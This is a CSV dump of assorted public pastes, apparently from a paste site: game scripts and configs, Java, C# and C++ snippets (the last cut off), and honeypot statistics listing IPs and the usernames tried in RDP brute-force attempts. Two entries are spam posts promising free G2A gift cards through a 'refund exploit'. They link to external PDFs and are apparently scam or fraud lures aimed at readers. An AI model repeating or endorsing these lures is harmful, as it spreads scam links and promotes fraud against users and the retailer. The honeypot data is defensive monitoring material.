id,title,username,language,date,content
ZqSrvjTz,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,jusst2k4,GetText,Sunday 14th of April 2024 09:07:51 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1thJ3r_goEZ3BA-wE8sNYbGUhGv6gTnXz/view?usp=g2a_refund_exploit_157403.pdf

Working as of:
15 April 2024"
LJPCAJjW,startup.lua,enimaloc,Lua,Sunday 14th of April 2024 09:00:29 PM CDT,"-- FRONT = Gate
-- UP = Gate Detector
-- BACK = Control
GATE = ""front""
GATE_DETECTOR = ""up""
TRAIN_CONTROL = ""back""
DETECTOR_1 = ""right""
DETECTOR_2 = ""left""

redstone.setOutput(TRAIN_CONTROL, true)
oldLeft = false
oldRight = false

function getDetector()
    local right = redstone.getInput(DETECTOR_1)
    local left  = redstone.getInput(DETECTOR_2)
    return right, left
end

function awaitDetector()
    os.pullEvent(""redstone"")
    local r, l = getDetector()
    if r or l then
        return r, l
    else
        return awaitDetector()
    end
end

function awaitGate()
    os.pullEvent(""redstone"")
    local gd = redstone.getInput(GATE_DETECTOR)
    if gd then
        return gd
    else
        return awaitGate()
    end
end

function signalGate()
    redstone.setOutput(GATE, true)
    sleep(1)
    redstone.setOutput(GATE, false)
end

while true do
    local right, left = awaitDetector()
    if left ~= oldLeft or right ~= oldRight then
		signalGate()
        os.pullEvent(""redstone"")
        redstone.setOutput(TRAIN_CONTROL, false)
   		local r, l = awaitDetector()
		while not (left and r) and not (right and l) do
			r, l = awaitDetector()
		end
        if (left and r) or (right and l) then
            redstone.setOutput(TRAIN_CONTROL, true)
		    signalGate()
        end
        oldRight = right
        oldLeft = left
    end
end"
2KxwfQW5,邀您一起看：云口令,xiaomianao666,JavaScript,Sunday 14th of April 2024 08:55:53 PM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥云口令@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5LqR5Y+j5LukXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcIng1X3dlYnZpZXdfc2luZ2xlXCIsXCJmaW5kX3J1bGVcIjpcImpzOnNldFJlc3VsdChbe1xcbiAgICB1cmw6XFxcImh0dHBzOi8veGlhb21pYW5hby5sYW56b3VtLmNvbS9peWFDZDF2NTNpeGNcXFwiLFxcbmRlc2M6XFxcIjEwMCUmJmZsb2F0XFxcIixcXG5leHRyYTp7Y2FuQmFjazogdHJ1ZX1cXG59XSk7XCIsXCJncm91cFwiOlwiXCJ9IiwidGl0bGUiOiLkupHlj6Pku6QifQ==
4pS058Yt,RacePoint to Donation,XConquer,C#,Sunday 14th of April 2024 08:41:12 PM CDT,"how to use/convert RacePoint Store to Donation Store

1.- in the Source and Client find the File named RacePointShop.ini 
2.- Modify the File as u Like for example Delete all items and make Empty File, for example this [ https://prnt.sc/mPY-jrg5zKDW ]
3.- Same Modifys in the SOURCE/CLIENT (Same File)
4.- Explanation of the code in the Shop 
616439  5000  item     other      new
IDITEM	Price NotMove  NotMove	  Sticker new or hot

for example if i want added Wings i make like this 
204009 2000000 item other new

5.- How i can give the Points to Players can make Command or put in Bosses with this Code:
 killer.Owner.RacePoints += 50;//This code is for Points
===================================================
if u want i make all, have a cost."
9jKziZ70,Added Points in the Bosses,XConquer,C#,Sunday 14th of April 2024 08:34:05 PM CDT,"how to added points in the Bosses Drachma or Phoenix at the same 
MonsterTable.cs find Bosses Names example ""SnowBanshee"" and added as u Like 

 killer.DrachmaOfficer += 1;
 killer.ThePhoenix += 1;

so u can modify as u Like.

https://prnt.sc/p8F2yx4_GK35  Check image for example."
gwueP4Kv,Deo koda,El_Azar99,Java,Sunday 14th of April 2024 08:28:46 PM CDT,"int hrs = match.getSchedule().getDateTime().getHour();
int min = match.getSchedule().getDateTime().getMinute();
if ((hrs > 20 || (hrs == 20 && min > 0)) && (this instanceof Stadium)) {
    throw new AddingMatchException(""Match starts too late to be added to Stadium, try earlier than 8pm!"");
} else {
    ArrayList<Athlete> athletesList = match.getAthletesList();
    if (athletesList == null || athletesList.isEmpty()) {
        throw new SportDisciplineException(""No athletes assigned to the match."");
    }
    for (Athlete athlete : athletesList) {
        if (athlete.getDiscipline() != this.getDiscipline()) {
            throw new SportDisciplineException(""Unable to add the match to the venue, as the venue accepts matches of discipline "" + this.getDiscipline() + "", and athlete "" + athlete.getName() + "" assigned to the match competes in discipline "" + athlete.getDiscipline() + ""."");
        }
    }

    for (int i = 0; i < listOfMatches.length; i++) {
        if (listOfMatches[i] == null) {
            listOfMatches[i] = match;
            System.out.println(""Successfully added match: \n"" + match.toString());
            break;
        } else if (i == listOfMatches.length - 1) {
            throw new AddingMatchException(""List of matches is full!"");
        }
    }
}"
C85ZEVa4,Untitled,Diamond32_Tutoriales,C#,Sunday 14th of April 2024 07:51:35 PM CDT,"//CAMBIAR VALORES DESDE ADENTRO DE LAS SALAS
        if (PhotonNetwork.InRoom)
        {
            Hashtable newdata = PhotonNetwork.CurrentRoom.CustomProperties;

            newdata[""HOLA""] = 3000;

            PhotonNetwork.CurrentRoom.SetCustomProperties(newdata);
        }


//CREAR SALA Y ASIGNAR CUSTOMS PROPERTIES
RoomOptions roomOptions = new RoomOptions();
roomOptions.MaxPlayers = 5;
roomOptions.IsVisible = true;
roomOptions.IsOpen = true;

Hashtable roomSettings = new Hashtable();
roomSettings[""HOLA""] = 100;

roomOptions.CustomRoomProperties = roomSettings;
roomOptions.CustomRoomPropertiesForLobby = new string[] { ""HOLA"" };

string roomName = ""Room"" + (Random.Range(10000, 99999)).ToString();

PhotonNetwork.JoinRandomOrCreateRoom(null, 0, MatchmakingMode.FillRoom, TypedLobby.Default, null, roomName, roomOptions);






//OBTENER CUSTOMS PROPERTIES DESDE EL ROOMINFO DESDE EL LOBBY
    public RoomInfo info_room;

    private void Start()
    {
        Hashtable customs = info_room.CustomProperties;

        if (customs.ContainsKey(""HOLA""))
        {
#if UNITY_EDITOR
            Debug.Log(customs[""HOLA""]);
#endif
            GetComponentInChildren<TextMeshProUGUI>().text = ""Room: "" + info_room.Name + "" | Players: "" + info_room.PlayerCount + ""/"" + info_room.MaxPlayers + "" | VALOR: "" + (int)customs[""HOLA""];
        }
        else
        {
            GetComponentInChildren<TextMeshProUGUI>().text = ""Room: "" + info_room.Name + "" | Players: "" + info_room.PlayerCount + ""/"" + info_room.MaxPlayers;
        }
    }"
vNsnKjBK,🤑 G2A.com Free Gift Card Guide Apr 2024 FIX 🤑,ssss50w,GetText,Sunday 14th of April 2024 07:47:31 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.
 
This is the most up to date version of this script. Any other one posted will not work!
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view?usp=sharing
  
Working as of:
15 April 2024"
3Y0ZwscA,2024-04-14_stats.json,rdp_snitch,JSON,Sunday 14th of April 2024 07:18:24 PM CDT,"{
  ""ip"": {
    ""165.154.129.130"": 3,
    ""58.218.204.183"": 9,
    ""3.110.161.54"": 6,
    ""198.235.24.76"": 9,
    ""194.165.16.73"": 6,
    ""167.99.186.189"": 6,
    ""194.165.16.78"": 6,
    ""152.42.186.54"": 3,
    ""185.170.144.3"": 6,
    ""87.251.75.120"": 6,
    ""152.32.245.196"": 3,
    ""84.17.46.239"": 3,
    ""196.190.117.7"": 6,
    ""205.210.31.171"": 9,
    ""110.42.102.173"": 3,
    ""116.204.125.52"": 9,
    ""36.91.222.100"": 6,
    ""87.251.75.145"": 3,
    ""193.53.245.249"": 3,
    ""112.4.139.162"": 3,
    ""96.8.115.25"": 3,
    ""194.165.16.11"": 6,
    ""45.227.254.26"": 6,
    ""45.227.254.49"": 3,
    ""198.235.24.204"": 9,
    ""87.251.75.64"": 3,
    ""116.140.196.215"": 3,
    ""71.6.134.235"": 30,
    ""152.32.183.213"": 726,
    ""94.232.46.132"": 3,
    ""194.169.175.21"": 3,
    ""205.210.31.52"": 9,
    ""162.142.125.211"": 3
  },
  ""asn"": {
    ""AS135377"": 732,
    ""AS4134"": 9,
    ""AS16509"": 6,
    ""AS396982"": 36,
    ""AS48721"": 18,
    ""AS14061"": 9,
    ""AS197414"": 6,
    ""AS208091"": 12,
    ""AS60068"": 3,
    ""AS24757"": 6,
    ""AS136188"": 3,
    ""AS55990"": 9,
    ""AS7713"": 6,
    ""AS209711"": 3,
    ""AS56046"": 3,
    ""AS36352"": 3,
    ""AS267784"": 9,
    ""AS4837"": 3,
    ""AS10439"": 30,
    ""AS212482"": 3,
    ""AS209605"": 3,
    ""AS398324"": 3
  },
  ""isp"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 732,
    ""Chinanet"": 9,
    ""Amazon Technologies Inc."": 6,
    ""Google LLC"": 36,
    ""Flyservers S.A."": 27,
    ""DigitalOcean, LLC"": 9,
    ""Xhost Internet Solutions LP"": 21,
    ""DataCamp Limited"": 3,
    ""Ethiotelecom"": 6,
    ""China Telecom"": 3,
    ""Huawei Cloud Service data center"": 9,
    ""PT Telekomunikasi Indonesia"": 6,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""HostPapa"": 3,
    ""China Unicom CHINA169 Network"": 3,
    ""CariNet, Inc."": 30,
    ""UAB Host Baltic"": 3,
    ""Censys, Inc."": 3
  },
  ""org"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""Chinanet JS"": 9,
    ""AWS EC2 (ap-south-1)"": 6,
    ""Palo Alto Networks, Inc"": 36,
    ""Flyservers S.A"": 18,
    ""DigitalOcean, LLC"": 6,
    ""Digital Ocean"": 3,
    ""Xhostis"": 6,
    ""Xhost Internet Solutions"": 12,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""Cdn77 AMS"": 3,
    ""Unknown"": 6,
    ""Ningbo Zhuo Zhi Innovation Network Technology Co., Ltd"": 3,
    ""Wonten Network Ltd."": 9,
    ""Telekomunikasi Indonesia"": 6,
    ""MUVHost - Vodafone Tuzla"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Michael Charlery"": 3,
    ""UAB Host Baltic"": 9,
    ""China United Network Communications Corporation Limited"": 3,
    ""CariNet, Inc."": 30,
    ""Ucloud Information Technology"": 726,
    ""Dmitriy Panchenko"": 3,
    ""EmanuelHosting LTD"": 3,
    ""Censys Inc"": 3
  },
  ""regionName"": {
    ""England"": 3,
    ""Jiangsu"": 12,
    ""Maharashtra"": 6,
    ""California"": 36,
    ""Kaunas"": 21,
    ""Ontario"": 6,
    ""South West"": 3,
    ""North Holland"": 21,
    ""Bangkok"": 3,
    ""Addis Ababa"": 6,
    ""Zhejiang"": 3,
    ""Beijing"": 12,
    ""Jakarta"": 6,
    ""Istanbul"": 3,
    ""Texas"": 3,
    ""Vilnius"": 9,
    ""Nevada"": 30,
    ""Virginia"": 726,
    ""Perm Krai"": 3,
    ""Michigan"": 3
  },
  ""country"": {
    ""United Kingdom"": 3,
    ""China"": 27,
    ""India"": 6,
    ""United States"": 798,
    ""Lithuania"": 30,
    ""Canada"": 6,
    ""Singapore"": 3,
    ""The Netherlands"": 21,
    ""Thailand"": 3,
    ""Ethiopia"": 6,
    ""Indonesia"": 6,
    ""Turkey"": 3,
    ""Russia"": 3
  },
  ""account"": {
    ""Administrator"": 192,
    ""hello"": 42,
    ""WvLWQQHkf"": 3,
    ""yrSwcd"": 3,
    ""IFTQUa"": 3,
    ""Test"": 36,
    ""Administr"": 24,
    ""LNVZfNLXV"": 3,
    ""flrxNC"": 3,
    ""nmVZfp"": 3,
    ""(empty)"": 12,
    ""kKPHVbV"": 3,
    ""JvmojkaLX"": 3,
    ""dycCjG"": 3,
    ""cuGDNl"": 3,
    ""eltons"": 15,
    ""administr"": 15,
    ""Admin"": 201,
    ""Whatuptime.com"": 180,
    ""Jakartakini123#"": 159,
    ""MyXgIXBAB"": 3,
    ""WyNyMj"": 3,
    ""DgxXTh"": 3
  },
  ""keyboard"": {
    ""Unknown"": 915
  },
  ""client_build"": {
    ""Unknown"": 915
  },
  ""client_name"": {
    ""Unknown"": 915
  },
  ""ip_type"": {
    ""hosting"": 786,
    ""Unknown"": 81,
    ""hosting & proxy"": 42,
    ""mobile"": 3,
    ""proxy"": 3
  }
}"
wjw9d2Gy,2024-04-14_stats.json,rdp_snitch,JSON,Sunday 14th of April 2024 07:16:12 PM CDT,"{
  ""ip"": {
    ""165.154.129.130"": 2,
    ""58.218.204.183"": 6,
    ""3.110.161.54"": 4,
    ""198.235.24.76"": 6,
    ""194.165.16.73"": 4,
    ""167.99.186.189"": 4,
    ""194.165.16.78"": 4,
    ""152.42.186.54"": 2,
    ""185.170.144.3"": 4,
    ""87.251.75.120"": 4,
    ""152.32.245.196"": 2,
    ""84.17.46.239"": 2,
    ""196.190.117.7"": 4,
    ""205.210.31.171"": 6,
    ""110.42.102.173"": 2,
    ""116.204.125.52"": 6,
    ""36.91.222.100"": 4,
    ""87.251.75.145"": 2,
    ""193.53.245.249"": 2,
    ""112.4.139.162"": 2,
    ""96.8.115.25"": 2,
    ""194.165.16.11"": 4,
    ""45.227.254.26"": 4,
    ""45.227.254.49"": 2,
    ""198.235.24.204"": 6,
    ""87.251.75.64"": 2,
    ""116.140.196.215"": 2,
    ""71.6.134.235"": 20,
    ""152.32.183.213"": 484,
    ""94.232.46.132"": 2,
    ""194.169.175.21"": 2,
    ""205.210.31.52"": 6,
    ""162.142.125.211"": 2
  },
  ""asn"": {
    ""AS135377"": 488,
    ""AS4134"": 6,
    ""AS16509"": 4,
    ""AS396982"": 24,
    ""AS48721"": 12,
    ""AS14061"": 6,
    ""AS197414"": 4,
    ""AS208091"": 8,
    ""AS60068"": 2,
    ""AS24757"": 4,
    ""AS136188"": 2,
    ""AS55990"": 6,
    ""AS7713"": 4,
    ""AS209711"": 2,
    ""AS56046"": 2,
    ""AS36352"": 2,
    ""AS267784"": 6,
    ""AS4837"": 2,
    ""AS10439"": 20,
    ""AS212482"": 2,
    ""AS209605"": 2,
    ""AS398324"": 2
  },
  ""isp"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 488,
    ""Chinanet"": 6,
    ""Amazon Technologies Inc."": 4,
    ""Google LLC"": 24,
    ""Flyservers S.A."": 18,
    ""DigitalOcean, LLC"": 6,
    ""Xhost Internet Solutions LP"": 14,
    ""DataCamp Limited"": 2,
    ""Ethiotelecom"": 4,
    ""China Telecom"": 2,
    ""Huawei Cloud Service data center"": 6,
    ""PT Telekomunikasi Indonesia"": 4,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""HostPapa"": 2,
    ""China Unicom CHINA169 Network"": 2,
    ""CariNet, Inc."": 20,
    ""UAB Host Baltic"": 2,
    ""Censys, Inc."": 2
  },
  ""org"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""Chinanet JS"": 6,
    ""AWS EC2 (ap-south-1)"": 4,
    ""Palo Alto Networks, Inc"": 24,
    ""Flyservers S.A"": 12,
    ""DigitalOcean, LLC"": 4,
    ""Digital Ocean"": 2,
    ""Xhostis"": 4,
    ""Xhost Internet Solutions"": 8,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""Cdn77 AMS"": 2,
    ""Unknown"": 4,
    ""Ningbo Zhuo Zhi Innovation Network Technology Co., Ltd"": 2,
    ""Wonten Network Ltd."": 6,
    ""Telekomunikasi Indonesia"": 4,
    ""MUVHost - Vodafone Tuzla"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Michael Charlery"": 2,
    ""UAB Host Baltic"": 6,
    ""China United Network Communications Corporation Limited"": 2,
    ""CariNet, Inc."": 20,
    ""Ucloud Information Technology"": 484,
    ""Dmitriy Panchenko"": 2,
    ""EmanuelHosting LTD"": 2,
    ""Censys Inc"": 2
  },
  ""regionName"": {
    ""England"": 2,
    ""Jiangsu"": 8,
    ""Maharashtra"": 4,
    ""California"": 24,
    ""Kaunas"": 14,
    ""Ontario"": 4,
    ""South West"": 2,
    ""North Holland"": 14,
    ""Bangkok"": 2,
    ""Addis Ababa"": 4,
    ""Zhejiang"": 2,
    ""Beijing"": 8,
    ""Jakarta"": 4,
    ""Istanbul"": 2,
    ""Texas"": 2,
    ""Vilnius"": 6,
    ""Nevada"": 20,
    ""Virginia"": 484,
    ""Perm Krai"": 2,
    ""Michigan"": 2
  },
  ""country"": {
    ""United Kingdom"": 2,
    ""China"": 18,
    ""India"": 4,
    ""United States"": 532,
    ""Lithuania"": 20,
    ""Canada"": 4,
    ""Singapore"": 2,
    ""The Netherlands"": 14,
    ""Thailand"": 2,
    ""Ethiopia"": 4,
    ""Indonesia"": 4,
    ""Turkey"": 2,
    ""Russia"": 2
  },
  ""account"": {
    ""Administrator"": 128,
    ""hello"": 28,
    ""WvLWQQHkf"": 2,
    ""yrSwcd"": 2,
    ""IFTQUa"": 2,
    ""Test"": 24,
    ""Administr"": 16,
    ""LNVZfNLXV"": 2,
    ""flrxNC"": 2,
    ""nmVZfp"": 2,
    ""(empty)"": 8,
    ""kKPHVbV"": 2,
    ""JvmojkaLX"": 2,
    ""dycCjG"": 2,
    ""cuGDNl"": 2,
    ""eltons"": 10,
    ""administr"": 10,
    ""Admin"": 134,
    ""Whatuptime.com"": 120,
    ""Jakartakini123#"": 106,
    ""MyXgIXBAB"": 2,
    ""WyNyMj"": 2,
    ""DgxXTh"": 2
  },
  ""keyboard"": {
    ""Unknown"": 610
  },
  ""client_build"": {
    ""Unknown"": 610
  },
  ""client_name"": {
    ""Unknown"": 610
  },
  ""ip_type"": {
    ""hosting"": 524,
    ""Unknown"": 54,
    ""hosting & proxy"": 28,
    ""mobile"": 2,
    ""proxy"": 2
  }
}"
Ym4YC7GW,2024-04-14_stats.json,rdp_snitch,JSON,Sunday 14th of April 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""165.154.129.130"": 1,
    ""58.218.204.183"": 3,
    ""3.110.161.54"": 2,
    ""198.235.24.76"": 3,
    ""194.165.16.73"": 2,
    ""167.99.186.189"": 2,
    ""194.165.16.78"": 2,
    ""152.42.186.54"": 1,
    ""185.170.144.3"": 2,
    ""87.251.75.120"": 2,
    ""152.32.245.196"": 1,
    ""84.17.46.239"": 1,
    ""196.190.117.7"": 2,
    ""205.210.31.171"": 3,
    ""110.42.102.173"": 1,
    ""116.204.125.52"": 3,
    ""36.91.222.100"": 2,
    ""87.251.75.145"": 1,
    ""193.53.245.249"": 1,
    ""112.4.139.162"": 1,
    ""96.8.115.25"": 1,
    ""194.165.16.11"": 2,
    ""45.227.254.26"": 2,
    ""45.227.254.49"": 1,
    ""198.235.24.204"": 3,
    ""87.251.75.64"": 1,
    ""116.140.196.215"": 1,
    ""71.6.134.235"": 10,
    ""152.32.183.213"": 242,
    ""94.232.46.132"": 1,
    ""194.169.175.21"": 1,
    ""205.210.31.52"": 3,
    ""162.142.125.211"": 1
  },
  ""asn"": {
    ""AS135377"": 244,
    ""AS4134"": 3,
    ""AS16509"": 2,
    ""AS396982"": 12,
    ""AS48721"": 6,
    ""AS14061"": 3,
    ""AS197414"": 2,
    ""AS208091"": 4,
    ""AS60068"": 1,
    ""AS24757"": 2,
    ""AS136188"": 1,
    ""AS55990"": 3,
    ""AS7713"": 2,
    ""AS209711"": 1,
    ""AS56046"": 1,
    ""AS36352"": 1,
    ""AS267784"": 3,
    ""AS4837"": 1,
    ""AS10439"": 10,
    ""AS212482"": 1,
    ""AS209605"": 1,
    ""AS398324"": 1
  },
  ""isp"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 244,
    ""Chinanet"": 3,
    ""Amazon Technologies Inc."": 2,
    ""Google LLC"": 12,
    ""Flyservers S.A."": 9,
    ""DigitalOcean, LLC"": 3,
    ""Xhost Internet Solutions LP"": 7,
    ""DataCamp Limited"": 1,
    ""Ethiotelecom"": 2,
    ""China Telecom"": 1,
    ""Huawei Cloud Service data center"": 3,
    ""PT Telekomunikasi Indonesia"": 2,
    ""MUV Bilisim ve Telekomunikasyon Hizmetleri Ltd. Sti"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""HostPapa"": 1,
    ""China Unicom CHINA169 Network"": 1,
    ""CariNet, Inc."": 10,
    ""UAB Host Baltic"": 1,
    ""Censys, Inc."": 1
  },
  ""org"": {
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""Chinanet JS"": 3,
    ""AWS EC2 (ap-south-1)"": 2,
    ""Palo Alto Networks, Inc"": 12,
    ""Flyservers S.A"": 6,
    ""DigitalOcean, LLC"": 2,
    ""Digital Ocean"": 1,
    ""Xhostis"": 2,
    ""Xhost Internet Solutions"": 4,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""Cdn77 AMS"": 1,
    ""Unknown"": 2,
    ""Ningbo Zhuo Zhi Innovation Network Technology Co., Ltd"": 1,
    ""Wonten Network Ltd."": 3,
    ""Telekomunikasi Indonesia"": 2,
    ""MUVHost - Vodafone Tuzla"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Michael Charlery"": 1,
    ""UAB Host Baltic"": 3,
    ""China United Network Communications Corporation Limited"": 1,
    ""CariNet, Inc."": 10,
    ""Ucloud Information Technology"": 242,
    ""Dmitriy Panchenko"": 1,
    ""EmanuelHosting LTD"": 1,
    ""Censys Inc"": 1
  },
  ""regionName"": {
    ""England"": 1,
    ""Jiangsu"": 4,
    ""Maharashtra"": 2,
    ""California"": 12,
    ""Kaunas"": 7,
    ""Ontario"": 2,
    ""South West"": 1,
    ""North Holland"": 7,
    ""Bangkok"": 1,
    ""Addis Ababa"": 2,
    ""Zhejiang"": 1,
    ""Beijing"": 4,
    ""Jakarta"": 2,
    ""Istanbul"": 1,
    ""Texas"": 1,
    ""Vilnius"": 3,
    ""Nevada"": 10,
    ""Virginia"": 242,
    ""Perm Krai"": 1,
    ""Michigan"": 1
  },
  ""country"": {
    ""United Kingdom"": 1,
    ""China"": 9,
    ""India"": 2,
    ""United States"": 266,
    ""Lithuania"": 10,
    ""Canada"": 2,
    ""Singapore"": 1,
    ""The Netherlands"": 7,
    ""Thailand"": 1,
    ""Ethiopia"": 2,
    ""Indonesia"": 2,
    ""Turkey"": 1,
    ""Russia"": 1
  },
  ""account"": {
    ""Administrator"": 64,
    ""hello"": 14,
    ""WvLWQQHkf"": 1,
    ""yrSwcd"": 1,
    ""IFTQUa"": 1,
    ""Test"": 12,
    ""Administr"": 8,
    ""LNVZfNLXV"": 1,
    ""flrxNC"": 1,
    ""nmVZfp"": 1,
    ""(empty)"": 4,
    ""kKPHVbV"": 1,
    ""JvmojkaLX"": 1,
    ""dycCjG"": 1,
    ""cuGDNl"": 1,
    ""eltons"": 5,
    ""administr"": 5,
    ""Admin"": 67,
    ""Whatuptime.com"": 60,
    ""Jakartakini123#"": 53,
    ""MyXgIXBAB"": 1,
    ""WyNyMj"": 1,
    ""DgxXTh"": 1
  },
  ""keyboard"": {
    ""Unknown"": 305
  },
  ""client_build"": {
    ""Unknown"": 305
  },
  ""client_name"": {
    ""Unknown"": 305
  },
  ""ip_type"": {
    ""hosting"": 262,
    ""Unknown"": 27,
    ""hosting & proxy"": 14,
    ""mobile"": 1,
    ""proxy"": 1
  }
}"
ikwc28xL,cs2config,jkirem,JSON,Sunday 14th of April 2024 06:26:21 PM CDT,"alias ""+jumpaction"" ""+jump;""
alias ""+throwaction"" ""-attack; -attack2""
alias ""-jumpaction"" ""-jump""
    
bind n ""+jumpaction;+throwaction;""
bind ""t"" = ""+cl_show_team_equipment""
bind ""c"" = ""smoke;+lookatweapon;-lookatweapon""

alias knife slot3
alias he slot6
alias flash slot7
alias smoke slot8
alias fire slot10


alias ""+hjump"" ""+jump; +duck""; 
alias ""-hjump"" ""-jump; -duck""; 
bind space ""+hjump""

bind ""MOUSE4"" = ""knife;he;fire;+lookatweapon;-lookatweapon""
bind ""MOUSE5"" = ""knife;smoke;flash;+lookatweapon;-lookatweapon""


alias dd ""disconnect; aa""
alias aa ""exec autoexec.cfg""
alias pp ""exec praccfg.cfg"""
Dqj0W57w,Laberinto con A Star y Raylib,nBiker77,C++,Sunday 14th of April 2024 05:52:41 PM CDT,"// 
// ██╗      █████╗ ██████╗ ███████╗██████╗ ██╗███╗   ██╗████████╗ ██████╗ 
// ██║     ██╔══██╗██╔══██╗██╔════╝██╔══██╗██║████╗  ██║╚══██╔══╝██╔═══██╗
// ██║     ███████║██████╔╝█████╗  ██████╔╝██║██╔██╗ ██║   ██║   ██║   ██║
// ██║     ██╔══██║██╔══██╗██╔══╝  ██╔══██╗██║██║╚██╗██║   ██║   ██║   ██║
// ███████╗██║  ██║██████╔╝███████╗██║  ██║██║██║ ╚████║   ██║   ╚██████╔╝
// ╚══════╝╚═╝  ╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝   ╚═╝    ╚═════╝ 

/*
Nombre del archivo: laberinto.cpp
Nombre del programa: Laberinto solucion por algoitmos de busqueda

Autor(es): Natxo Varona, IA's
Fecha de creación: 2024-04-12
Versión: 1.5
Licencia: GPLv3
Descripción breve: Este programa calcula la forma optima de salir de un laberinto.
Palabras clave: laberinto, aritmético, busqueda, cálculo, .
Contacto: nvarona@hotmail.es, ia@ia.com
Dependencias: libreiria raylib

Descripcion: Resolucion de un supuesto laberinto utilizando el Algoritmo (A-star).*
 
Este código implementa el algoritmo A* para encontrar la ruta más corta en un laberinto representado 
por una matriz de caracteres. Se utiliza una cola de prioridad para explorar los nodos de acuerdo con 
su valor de f, que es la suma de los valores g y h. La función de evaluación h es la distancia 
euclidiana desde un nodo hasta el nodo objetivo. La función de evaluación g es la distancia 
recorrida desde el nodo inicial hasta el nodo actual.

Instrucciones de uso:
1. Compilar el programa: g++ laberinto.cpp -o laberinto -lraylib -std=c++11
2. Ejecutar el programa: ./laberinto
3. Ingresar los números separados por espacios: 1 2 3 4 5
4. El programa mostrará en una ventana grafica un laberinto y su solucion.

Historial de cambios:
- Versión 1.0 (2024-04-12): Implementación inicial del programa.
- Versión 1.5 (2024-04-14): Implementacion de impresion de inicio, final y ruta.
*/

#include <iostream>
#include <ctime>
#include <vector>
#include <queue>
#include <utility>
#include <cmath>
#include <climits>
#include <raylib.h>

using namespace std;

// Definicion de variables y constantes para el programa -----------------
Color Green = Color{38, 185, 154, 255};
Color Dark_Green = Color{20, 160, 133, 255};
Color Light_Green = Color{129, 204, 184, 255};
Color Yellow = Color{243, 213, 91, 255};
Color Grey = Color{29, 29, 29, 255};
Color lightGreen = {173, 204, 96, 255};
Color darkGreen = {43, 51, 24, 255};

const int START = 2;     // Carácter que representa el inicio
const int GOAL = 3;      // Carácter que representa la meta
const int mazeWidth = 10;
const int mazeHeight = 10;

// Definición del laberinto como una matriz de caracteres ---------------
int maze[mazeWidth][mazeHeight] = {
    {1, 2, 1, 1, 1, 1, 1, 1, 1, 1},
    {1, 0, 0, 0, 1, 0, 0, 0, 0, 1},
    {1, 0, 1, 0, 1, 0, 1, 1, 0, 1},
    {1, 0, 1, 0, 1, 0, 1, 0, 0, 1},
    {1, 0, 1, 0, 1, 0, 1, 0, 1, 1},
    {1, 0, 1, 0, 0, 0, 1, 0, 0, 1},
    {1, 0, 1, 1, 1, 0, 1, 1, 0, 1},
    {1, 0, 0, 0, 1, 0, 0, 0, 0, 1},
    {1, 1, 1, 0, 1, 1, 1, 1, 0, 1},
    {1, 1, 1, 1, 1, 1, 1, 1, 3, 1}
};

// Direcciones posibles para explorar (arriba, abajo, izquierda, derecha)
int dx[] = {-1, 1, 0, 0};
int dy[] = {0, 0, -1, 1};

// Función para calcular la distancia euclidiana entre dos puntos en el laberinto
double heuristic(int x, int y, int goal_x, int goal_y) {
    return sqrt((x - goal_x) * (x - goal_x) + (y - goal_y) * (y - goal_y));
}

// Estructura para representar un nodo en el laberinto
struct Node {
    int x, y;       // Posición del nodo
    double f, g, h; // Valores de la función de evaluación
};

// Sobrecarga del operador < para ordenar los nodos en función del valor f
bool operator<(const Node& a, const Node& b) {
    return a.f > b.f; // Orden inverso para que la cola de prioridad tenga el menor f en el frente
}

// Función para verificar si una posición está dentro del laberinto y es transitable
bool isValid(int x, int y, int mazeWidth, int mazeHeight) {
    return (x >= 0 && x < mazeWidth && y >= 0 && y < mazeHeight && maze[x][y] != '1');
}

// Función para encontrar la ruta más corta utilizando el algoritmo A*
vector<pair<int, int>> AStar(int start_x, int start_y, int goal_x, int goal_y, int mazeWidth, int mazeHeight) {
    // Crear una cola de prioridad para almacenar los nodos a explorar
    priority_queue<Node> pq;

    // Crear un arreglo para almacenar los valores de g y h de cada nodo
